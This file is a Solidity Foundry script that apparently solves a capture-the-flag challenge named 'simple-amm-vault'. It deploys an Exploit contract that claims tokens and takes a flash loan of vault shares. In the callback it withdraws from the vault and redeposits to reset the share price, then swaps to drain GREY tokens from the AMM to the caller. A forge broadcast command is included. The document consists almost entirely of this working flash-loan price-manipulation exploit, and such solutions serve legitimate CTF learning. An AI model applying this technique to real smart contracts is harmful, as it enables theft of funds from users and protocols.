// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Setup} from "src/simple-amm-vault/Setup.sol";

contract Solution is Script {
    Setup setup = Setup(0x9303d86B193825658E59e7c740fe73478f44BB58);

    function run() public {
        vm.startBroadcast();

        Exploit e = new Exploit(setup);
        e.solve();

        vm.stopBroadcast();
    }
}

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Flash loan 1000 SV from the AMM
        setup.amm().flashLoan(true, 1000e18, "");

        // Drain 1000 GREY from the AMM
        setup.amm().swap(true, 0, 1000e18);

        // Transfer all GREY to msg.sender
        setup.grey().transfer(
            msg.sender, 
            setup.grey().balanceOf(address(this))
        );
    }

    function onFlashLoan(uint256 svAmount, bytes calldata) external {
        // Burn 1000 SV for 2000 GREY
        setup.vault().withdraw(svAmount);
        
        // Deposit 1000 GREY for 1000 SV. Share price is now 1:1
        setup.grey().approve(address(setup.vault()), 1000e18);
        setup.vault().deposit(1000e18);

        // Approve SV for AMM to return the flash loan
        setup.vault().approve(address(setup.amm()), svAmount);
    }
}

// forge script script/SimpleAMMVault.s.sol:Solution --rpc-url <rpc_url> --private-key <private_key> --broadcast
